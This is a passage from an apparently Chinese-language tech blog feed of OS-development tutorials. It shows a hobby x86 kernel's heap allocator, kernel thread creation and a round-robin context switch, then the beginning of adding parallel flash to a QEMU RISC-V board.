class="line">		<span class="type">uint32_t</span> page;</span><br><span class="line">		get_mapping(pgd_kern, heap_max, &amp;page);</span><br><span class="line">		unmap(pgd_kern, heap_max);</span><br><span class="line">		pmm_free_page(page);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">split_chunk</span><span class="params">(<span class="type">header_t</span> *chunk, <span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 切分内存块之前得保证之后的剩余内存至少容纳一个内存管理块的大小</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;length - len &gt; <span class="keyword">sizeof</span> (<span class="type">header_t</span>)) &#123;</span><br><span class="line">		<span class="type">header_t</span> *newchunk = (<span class="type">header_t</span> *)((<span class="type">uint32_t</span>)chunk + len);</span><br><span class="line">		newchunk-&gt;prev = chunk;</span><br><span class="line">		newchunk-&gt;next = chunk-&gt;next;</span><br><span class="line">		newchunk-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">		newchunk-&gt;length = chunk-&gt;length - len;</span><br><span class="line"></span><br><span class="line">		chunk-&gt;next = newchunk;</span><br><span class="line">		chunk-&gt;length = len;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">glue_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 如果该内存块后面有链内存块且未被使用则拼合</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;next &amp;&amp; chunk-&gt;next-&gt;allocated == <span class="number">0</span>) &#123;</span><br><span class="line">		chunk-&gt;length = chunk-&gt;length + chunk-&gt;next-&gt;length;</span><br><span class="line">		<span class="keyword">if</span> (chunk-&gt;next-&gt;next) &#123;</span><br><span class="line">			chunk-&gt;next-&gt;next-&gt;prev = chunk;</span><br><span class="line">		&#125;</span><br><span class="line">		chunk-&gt;next = chunk-&gt;next-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果该内存块前面有链内存块且未被使用则拼合</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;prev &amp;&amp; chunk-&gt;prev-&gt;allocated == <span class="number">0</span>) &#123;</span><br><span class="line">		chunk-&gt;prev-&gt;length = chunk-&gt;prev-&gt;length + chunk-&gt;length;</span><br><span class="line">		chunk-&gt;prev-&gt;next = chunk-&gt;next;</span><br><span class="line">		<span class="keyword">if</span> (chunk-&gt;next) &#123;</span><br><span class="line">			chunk-&gt;next-&gt;prev = chunk-&gt;prev;</span><br><span class="line">		&#125;</span><br><span class="line">		chunk = chunk-&gt;prev;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 假如该内存后面没有链表内存块了直接释放掉</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;next == <span class="number">0</span>) &#123;</span><br><span class="line">		free_chunk(chunk);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk_color(rc_black, rc_magenta, <span class="string">&quot;Test kmalloc() &amp;&amp; kfree() now ...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *addr1 = kmalloc(<span class="number">50</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc    50 byte in 0x%X\n&quot;</span>, addr1);</span><br><span class="line">	<span class="type">void</span> *addr2 = kmalloc(<span class="number">500</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc   500 byte in 0x%X\n&quot;</span>, addr2);</span><br><span class="line">	<span class="type">void</span> *addr3 = kmalloc(<span class="number">5000</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc  5000 byte in 0x%X\n&quot;</span>, addr3);</span><br><span class="line">	<span class="type">void</span> *addr4 = kmalloc(<span class="number">50000</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc 50000 byte in 0x%X\n\n&quot;</span>, addr4);</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr1);</span><br><span class="line">	kfree(addr1);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr2);</span><br><span class="line">	kfree(addr2);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr3);</span><br><span class="line">	kfree(addr3);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n\n&quot;</span>, addr4);</span><br><span class="line">	kfree(addr4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>init&#x2F;entry.c 加入头文件以及初始化heap 和 添加测试test_heap()  ！！</p>
<p>！！！注意 vmm的初始化一定要在pmm之后</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.c&quot;</span></span></span><br><span class="line">    </span><br><span class="line">....</span><br><span class="line">	init_heap();</span><br><span class="line">	test_heap();</span><br></pre></td></tr></table></figure>



<p>运行结果如下：</p>
<p><img src="/2024/05/20/x86-7-heap/image-20240521113202344.png" alt="image-20240521113202344"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86_thread</title>
    <url>/2024/05/21/x86-8-thread/</url>
    <content><![CDATA[<h1 id="12-内核线程的创建与切换"><a href="#12-内核线程的创建与切换" class="headerlink" title="12.内核线程的创建与切换"></a>12.内核线程的创建与切换</h1><p>此处的内核线程作为运行在内核态的一个逻辑执行流，用于私有的栈空间，但是除了私有的栈空间外，不拥有其他资源</p>
<p><strong>所以的内核线程拥有相同的页表，共享所有的全局数据</strong></p>
<p>一般OS 都不会完全采用硬件切换机制，但本简单的内核，只是涉及到内核态，不涉及特权级的转移过程，所以完全可以用硬件实现</p>
<blockquote>
<p>任务的切换必然涉及到现场的保护与恢复，所以就必然需要一个数据结构来保存这 些现场信息。这个数据结构中一般也会放置任务相关的一些信息并且以链表之类的方式 组织起来，这个结构被称之为<code>PCB（Process Control Block）</code>或者TCB（Task Control Block）</p>
</blockquote>
<blockquote>
<p>include&#x2F;task.h 函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_TASK_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_TASK_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// state 枚举</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">task_state</span>&#123;</span></span><br><span class="line">    TASK_UNINIT = <span class="number">0</span>,    <span class="comment">// 为初始化</span></span><br><span class="line">    TASK_SLEEPING = <span class="number">1</span>,  <span class="comment">// 睡眠</span></span><br><span class="line">    TASK_RUNNABLE = <span class="number">2</span>,  <span class="comment">// 可运行（也可能正在运行</span></span><br><span class="line">    TASK_ZOMBIE = <span class="number">3</span>,    <span class="comment">// 僵尸状态</span></span><br><span class="line">&#125;task_state;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程的上下文切换 保存的信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> esp;</span><br><span class="line">    <span class="type">uint32_t</span> ebp;</span><br><span class="line">    <span class="type">uint32_t</span> ebx;</span><br><span class="line">    <span class="type">uint32_t</span> esi;</span><br><span class="line">    <span class="type">uint32_t</span> edi;</span><br><span class="line">    <span class="type">uint32_t</span> eflags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程内存地址结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">pgd_t</span> *pgd_dir; <span class="comment">// 进程页表</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程控制块 PCB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> task_state state;  <span class="comment">// 进程当前状态</span></span><br><span class="line">    <span class="type">pid_t</span> pid;                  <span class="comment">// 进程标识符</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">stack</span>;                <span class="comment">// 进程的内核栈地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程的内存地址映像</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 进程切换需要的上下文信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next</span>;</span>   <span class="comment">// 链表指针volatile task_state state;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局pid 值</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">pid_t</span> now_pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程创建</span></span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">kernel_thread</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程退出函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kthread_exit</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>include&#x2F;types.h 补充</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> <span class="type">pid_t</span>;</span><br></pre></td></tr></table></figure>



<p>调度机制</p>
<blockquote>
<p>include&#x2F;sched.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_SCHEDULER_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_SCHEDULER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"><span class="comment">// 可调度进程连表</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">running_proc_head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待进程链表</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">wait_proc_head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前运行任务</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">current</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化任务调度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sched</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务调度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换准备</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_task_to</span> <span class="params">(<span class="keyword">struct</span> task_struct *next)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_to</span> <span class="params">(<span class="keyword">struct</span> context *prev, <span class="keyword">struct</span> context *next)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>所以任务组织的方式就是一个单向循环链表，调 度程序每次选择当前任务的下一个任务运行 </p>
<p>没有采用复杂的调度策略</p>
<p>在进行任务切换之前，内核原先的执行流还没有一个结构来保存其信息，所以需要在初 始化调度之前<strong>给原始的执行流创建PCB信息。这里模仿Linux内核早期的做法，将PCB放置 在线程栈的最低处</strong>。</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;sched.c  任务调度初始化代码如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可调度进程链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">running_proc_head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待进程链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">wait_proc_head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前运行的任务</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">current</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sched</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 为当前执行流创建信息结构体该结构位于当前执行流的栈最低端</span></span><br><span class="line">    current = (<span class="keyword">struct</span> task_struct *) (kern_stack_top - STACK_SIZE);</span><br><span class="line"></span><br><span class="line">    current-&gt;state = TASK_RUNNABLE;</span><br><span class="line">    current-&gt;pid = now_pid++;</span><br><span class="line">    current-&gt;<span class="built_in">stack</span> = current;</span><br><span class="line">    current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单向循环链表</span></span><br><span class="line">    current-&gt;next = current;</span><br><span class="line">    running_proc_head = current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>init&#x2F;entry.c 中加入 栈顶变量</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶</span></span><br><span class="line"><span class="type">uint32_t</span> kern_stack_top;</span><br></pre></td></tr></table></figure>



<p>调度函数实现，每次都返回当前任务的下一个任务  , 可以实现更复杂的调度函数</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;sched.c </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (current) &#123;</span><br><span class="line">        change_task_to(current-&gt;next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_task_to</span> <span class="params">(<span class="keyword">struct</span> task_struct *next)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != next) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev</span> =</span> current;</span><br><span class="line">        current = next;</span><br><span class="line">        switch_to(&amp;(prev-&gt;context), &amp;(current-&gt;context)); <span class="comment">// 交换上下文切换 由汇编实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>由汇编实现上下文切换</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;switch_to.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global switch_to]</span><br><span class="line">;</span><br><span class="line">;具体的线程切换操作 寄存器的保护和恢复</span><br><span class="line">switch_to:</span><br><span class="line">        mov eax, [esp+4]</span><br><span class="line"></span><br><span class="line">        mov [eax+0],  esp</span><br><span class="line">        mov [eax+4],  ebp</span><br><span class="line">        mov [eax+8],  ebx</span><br><span class="line">        mov [eax+12], esi</span><br><span class="line">        mov [eax+16], edi</span><br><span class="line">        pushf</span><br><span class="line">        pop ecx</span><br><span class="line">        mov [eax+20], ecx</span><br><span class="line"></span><br><span class="line">        mov eax, [esp+8]</span><br><span class="line"></span><br><span class="line">        mov esp, [eax+0]</span><br><span class="line">        mov ebp, [eax+4]</span><br><span class="line">        mov ebx, [eax+8]</span><br><span class="line">        mov esi, [eax+12]</span><br><span class="line">        mov edi, [eax+16]</span><br><span class="line">        mov eax, [eax+20]</span><br><span class="line">        push eax</span><br><span class="line">        popf</span><br><span class="line"> 	</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>



<p>在ret指令返回之前，由于之前的执行现场已经被切换，特别是esp指针指向 的栈被切换了，所以ret指令弹出的返回地址自然就变成了另一个执行流之前调用任务切换 函数之前保存的返回地址了。<strong>kernel_thread函数便是通过构造出这样一个切换后可以弹 出执行地址的初始栈来实现的。</strong></p>
<p>内核线程的创建和 退出函数</p>
<blockquote>
<p>kernel&#x2F;task&#x2F;task.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局 pid 值</span></span><br><span class="line"><span class="type">pid_t</span> now_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程创建</span></span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">kernel_thread</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">new_task</span> =</span> (<span class="keyword">struct</span> task_struct *)kmalloc(STACK_SIZE);</span><br><span class="line">	assert(new_task != <span class="literal">NULL</span>, <span class="string">&quot;kern_thread: kmalloc error&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将栈低端结构信息初始化为 0 </span></span><br><span class="line">	bzero(new_task, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> task_struct));</span><br><span class="line"></span><br><span class="line">	new_task-&gt;state = TASK_RUNNABLE;</span><br><span class="line">	new_task-&gt;<span class="built_in">stack</span> = current;</span><br><span class="line">	new_task-&gt;pid = now_pid++;</span><br><span class="line">	new_task-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> *stack_top = (<span class="type">uint32_t</span> *)((<span class="type">uint32_t</span>)new_task + STACK_SIZE);</span><br><span class="line"></span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)arg;</span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)kthread_exit;</span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)fn;</span><br><span class="line"></span><br><span class="line">	new_task-&gt;context.esp = (<span class="type">uint32_t</span>)new_task + STACK_SIZE - <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置新任务的标志寄存器未屏蔽中断，很重要</span></span><br><span class="line">	new_task-&gt;context.eflags = <span class="number">0x200</span>;</span><br><span class="line">	new_task-&gt;next = running_proc_head;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 找到当前的任务队列，插入到末尾</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tail</span> =</span> running_proc_head;</span><br><span class="line">	assert(tail != <span class="literal">NULL</span>, <span class="string">&quot;Must init sched!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (tail-&gt;next != running_proc_head) &#123;</span><br><span class="line">		tail = tail-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	tail-&gt;next = new_task;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> new_task-&gt;pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kthread_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> val <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;eax&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;Thread exited with value %d\n&quot;</span>, val);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>内核创建函数解析：</strong></p>
<p><strong>内核退出函数：</strong></p>
<p>内核退出函数在这里只实现了简陋的一部分，标准做法是将退出线程的PCB结构转移到 不可调度链表去，等待其他线程join后再清理结构。</p>
<p>时间片，修改timer.c函数</p>
<blockquote>
<p>drivers&#x2F;timers.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	schedule();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>修改entry.c</p>
<blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">			printk_color(rc_black, rc_green, <span class="string">&quot;B&quot;</span>);</span><br><span class="line">			flag = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test_heap();</span><br><span class="line"></span><br><span class="line">	init_sched();</span><br><span class="line"></span><br><span class="line">	kernel_thread(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 开启中断</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;</span><br><span class="line">	<span class="comment">//enable_intr();</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">			printk_color(rc_black, rc_red, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">			flag = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>通过中断实现线程切换的流程逻辑： 通过中断和简单的线程调度机制实现交替打印</p>
<ol>
<li>首先创建了一个内存线程thread函数，并且，初始化线程</li>
<li><code>init_timer(200)</code> 每200ms出发中断，，中断中进行系统调用</li>
<li><code>init_timer(200)</code>  —- <code>timecallback()</code> — <code>schedule()</code> — <code>change_task_to()更换线程</code> — <code>swicth_to()</code>进行上下文切换</li>
</ol>
<p><img src="/2024/05/21/x86-8-thread/image-20240521164433586.png" alt="image-20240521164433586"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-2-flash-itr-gpio</title>
    <url>/2024/06/02/qemu-riscv-add-flash-itr-gpio/</url>
    <content><![CDATA[<h1 id="1-添加flash"><a href="#1-添加flash" class="headerlink" title="1.添加flash"></a>1.添加flash</h1><blockquote>
<p>这里加的是pflash意为并行flash。</p>
</blockquote>
<blockquote>
<p>include&#x2F;quard_star.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QuardStarState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">    PFlashCFI01 *flash;   <span class="comment">// FLASH</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_FLASH,  <span class="comment">// FLASH</span></span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>quard_star.c</p>
<p>定义flash的起始地址和大小 32M</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;, <span class="comment">// 定义flash的起始地址和大小 32M</span></span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<ul>
<li>创建pflash，并且映射到系统总线对应的地址上，最后将其关联 到qemu参数 <code>-drive if=pflash, bus = 0, uint  = 0</code></li>
<li>这样启动的时候就可以将固件文件加载到这 这篇flash上</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_flash_create</span><span class="params">(MchineState *machine)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> QUARD_STAR_FLASH_SECTOR_SIZE (256 * KiB)</span></span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line">    MemoryRegion *system_memory = <span class="built_in">get_system_memory</span>();</span><br><span class="line">    DeviceState *dev = <span class="built_in">qdev_new</span>(TYPE_PFLASH_CFI01);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 一些参数的 配置</span></span><br><span class="line">    <span class="built_in">qdev_prop_set_uint64</span>(dev, <span class="string">&quot;sector-length&quot;</span>, QUARD_STAR_FLASH_SECTOR_SIZE);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint8</span>(dev, <span class="string">&quot;width&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint8</span>(dev, <span class="string">&quot;device-width&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_bit</span>(dev, <span class="string">&quot;big-endian&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id0&quot;</span>, <span class="number">0x89</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id1&quot;</span>, 